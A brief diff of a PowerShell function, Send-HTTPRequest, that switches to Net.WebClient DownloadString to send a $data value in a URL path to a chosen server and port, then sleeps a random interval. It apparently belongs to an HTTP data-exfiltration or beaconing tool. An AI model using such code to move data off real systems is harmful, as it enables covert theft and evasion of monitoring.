@@ -180,7 +180,7 @@ function Send-HTTPRequest {
     }
 
     $url = "http://" + $server + ":" + $port + "/" + $data;
-    Invoke-WebRequest $url
+    (New-Object Net.WebClient).DownloadString($url)
     If (!$sleep) {
         $sleep = Get-Random -minimum 0 -maximum 8; 
     }
